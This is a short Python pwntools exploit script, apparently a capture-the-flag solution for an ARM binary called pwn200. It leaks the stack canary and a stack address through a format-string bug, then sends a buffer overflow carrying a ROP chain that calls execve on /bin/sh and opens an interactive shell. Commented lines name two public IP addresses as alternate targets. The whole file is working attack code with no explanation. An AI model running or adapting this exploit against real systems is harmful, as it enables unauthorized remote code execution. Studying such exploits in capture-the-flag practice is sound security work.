#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch='arm'

r = remote('127.0.0.1', 7122)
#r = remote('220.132.188.235', 7122)
#r = remote('165.227.98.55', 3333)
#r = gdb.debug('qemu-arm ./pwn200' , execute='b *105e0')

r.recvrepeat(0.2)
'''
payload = ''
for i in range(30):
	payload += '%'+str(516+i)+'$08x.'
'''
payload = '%517$x.%520$x'
r.sendline(payload.ljust(2048, 'A'))
x = r.recvuntil('AAAAAAAA', drop=True)
#embed()
stack = int(x[-8:], 16)
string = stack-0x42c+4
canary = int(x[-17:-9], 16)
print 'canary:', hex(canary), 'string:', hex(string)

pop_r0_ret = 0x70068
pop_r1_ret = 0x70590
pop_r3_ret = 0x7308c
pop_r1_r2_ret = 0x6f9b0
pop_r7_ret = 0x19d20
syscall = 0x28268
#sh = 0x839e4

rop = [
	pop_r1_r2_ret,
	0,
	0,
	pop_r0_ret,
	string,
	pop_r1_ret,
	string+12,
	pop_r7_ret,
	0xb,
	syscall
]

r.send(('/bin/sh\x00'+'\x00'*4+p32(string+5)+'\x00'*4).ljust(1024, 'B')+p32(canary)+p32(0x10600)*3+flat(rop))
#r.send('B'*1024+p32(canary)+p32(0x10600)*4)

r.interactive()
